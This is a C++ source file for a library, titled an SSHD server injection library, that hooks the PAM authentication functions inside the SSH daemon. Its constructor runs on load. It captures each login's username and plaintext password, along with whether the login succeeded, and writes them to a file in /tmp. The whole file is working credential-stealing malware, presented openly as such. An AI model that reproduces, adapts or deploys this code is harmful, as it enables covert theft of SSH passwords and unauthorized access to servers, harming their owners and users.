/**
 * SSHD Server Injection Library
 * Intercepts PAM authentication functions to capture SSH passwords.
 */

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <security/pam_appl.h>
#include <chrono>
#include <time.h>

// Pointer to original PAM functions
static int (*pam_get_item_func)(const pam_handle_t *pamh, int item_type, const void **item) = NULL;
static int (*pam_authenticate_func)(pam_handle_t *pamh, int flags) = NULL;
static int (*pam_get_user_func)(pam_handle_t *pamh, const char **user, const char *prompt) = NULL;

// State machine for tracking authentication
enum State {
    UNKNOWN,
    INITIALIZED,
    PASSWORD_SET,
    FAILED,
    SUCCEEDED
};

struct AuthInfo {
    char username[256];
    char password[1024];
    bool succeeded;
};

class ServerAuthSpy {
private:
    AuthInfo info;
    State state;

    void Send() {
        // Get current timestamp
        auto t = std::chrono::system_clock::now();
        std::time_t t_time = std::chrono::system_clock::to_time_t(t);
        char time_buf[100];
        if (strftime(time_buf, sizeof(time_buf), "%c", std::localtime(&t_time))) {
            FILE* log_file = fopen("/tmp/sshd_inj.dbg", "a");
            if (log_file) {
                fprintf(log_file, "[ + ] Captured:\n");
                fprintf(log_file, "    Date: %s\n", time_buf);
                fprintf(log_file, "    Username: %s\n", this->info.username);
                fprintf(log_file, "    Password: \"%s\"\n", this->info.password);
                fprintf(log_file, "    Succeeded: %d\n", (int)this->info.succeeded);
                fprintf(log_file, "----\n");
                fclose(log_file);
            }
        }
    }

public:
    ServerAuthSpy() : state(UNKNOWN) {
        // Initialize the authentication info
        memset(&info, 0, sizeof(info));
        info.succeeded = false;
    }

    void Initiated() {
        state = INITIALIZED;
        FILE* log_file = fopen("/tmp/sshd_inj.dbg", "a");
        if (log_file) {
            fprintf(log_file, "[ + ] Server injection initialized (pid=%d)\n", getpid());
            fclose(log_file);
        }
    }

    void AuthenticationAttempt(bool authenticated) {
        if (state != PASSWORD_SET)
            return;

        state = authenticated ? SUCCEEDED : FAILED;
        info.succeeded = authenticated;
        Send();
    }

    void GotPasswordItem() {
        if (state == INITIALIZED || state == FAILED) {
            state = PASSWORD_SET;
        }
    }

    void SetUserPass(const char* user, const char* pass) {
        if (user && strlen(user) < sizeof(info.username)) {
            strncpy(info.username, user, sizeof(info.username) - 1);
            info.username[sizeof(info.username) - 1] = '\0';
        }
        
        if (pass && strlen(pass) < sizeof(info.password)) {
            strncpy(info.password, pass, sizeof(info.password) - 1);
            info.password[sizeof(info.password) - 1] = '\0';
        }
    }
};

// Global Spy instance
static ServerAuthSpy* spy = NULL;

// Hook for pam_get_item
extern "C" int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    // Initialize the function pointer if needed
    if (!pam_get_item_func) {
        void* handle = dlopen("libpam.so.0", RTLD_LAZY);
        if (!handle) handle = dlopen("libpam.so", RTLD_LAZY);
        if (!handle) {
            return PAM_SYSTEM_ERR;
        }
        
        pam_get_item_func = (int(*)(const pam_handle_t*, int, const void**))dlsym(handle, "pam_get_item");
        if (!pam_get_item_func) {
            return PAM_SYSTEM_ERR;
        }
    }

    // Call the original function
    int retval = pam_get_item_func(pamh, item_type, item);

    // If the item type is the authentication token (password) and it was successful
    if (item_type == PAM_AUTHTOK && retval == PAM_SUCCESS && *item != NULL) {
        // Get the username
        const char *username = NULL;
        if (pam_get_user_func) {
            pam_get_user_func((pam_handle_t*)pamh, &username, NULL);
        }

        if (spy) {
            spy->GotPasswordItem();
            spy->SetUserPass(username ? username : "unknown", (const char*)*item);
            
            FILE* log_file = fopen("/tmp/sshd_inj.dbg", "a");
            if (log_file) {
                fprintf(log_file, "... pam_get_item(PAM_AUTHTOK): %s:%s\n", 
                       username ? username : "unknown", (const char*)*item);
                fclose(log_file);
            }
        }
    }
    
    return retval;
}

// Hook for pam_authenticate
extern "C" int pam_authenticate(pam_handle_t *pamh, int flags) {
    // Initialize the function pointer if needed
    if (!pam_authenticate_func) {
        void* handle = dlopen("libpam.so.0", RTLD_LAZY);
        if (!handle) handle = dlopen("libpam.so", RTLD_LAZY);
        if (!handle) {
            return PAM_SYSTEM_ERR;
        }
        
        pam_authenticate_func = (int(*)(pam_handle_t*, int))dlsym(handle, "pam_authenticate");
        if (!pam_authenticate_func) {
            return PAM_SYSTEM_ERR;
        }
    }

    // Call the original function
    int retval = pam_authenticate_func(pamh, flags);

    // Log the result
    if (spy) {
        spy->AuthenticationAttempt(retval == PAM_SUCCESS);
        
        FILE* log_file = fopen("/tmp/sshd_inj.dbg", "a");
        if (log_file) {
            fprintf(log_file, "... pam_authenticate(..) returned %d\n", retval);
            fclose(log_file);
        }
    }
    
    return retval;
}

// Hook for pam_get_user
extern "C" int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
    // Initialize the function pointer if needed
    if (!pam_get_user_func) {
        void* handle = dlopen("libpam.so.0", RTLD_LAZY);
        if (!handle) handle = dlopen("libpam.so", RTLD_LAZY);
        if (!handle) {
            return PAM_SYSTEM_ERR;
        }
        
        pam_get_user_func = (int(*)(pam_handle_t*, const char**, const char*))dlsym(handle, "pam_get_user");
        if (!pam_get_user_func) {
            return PAM_SYSTEM_ERR;
        }
    }

    // Call the original function
    return pam_get_user_func(pamh, user, prompt);
}

// Constructor - runs when library is loaded
static __attribute__((constructor)) void init() {
    // Create spy instance
    spy = new ServerAuthSpy();
    
    FILE* log_file = fopen("/tmp/sshd_inj.dbg", "a");
    if (log_file) {
        fprintf(log_file, "[ + ] Loading server injection library into [%d]\n", (int)getpid());
        fclose(log_file);
    }
    
    spy->Initiated();
}

// Destructor - runs when library is unloaded
static __attribute__((destructor)) void fini() {
    if (spy) {
        delete spy;
        spy = NULL;
    }
    
    FILE* log_file = fopen("/tmp/sshd_inj.dbg", "a");
    if (log_file) {
        fprintf(log_file, "[ + ] Unloading server injection library from [%d]\n", (int)getpid());
        fclose(log_file);
    }
} 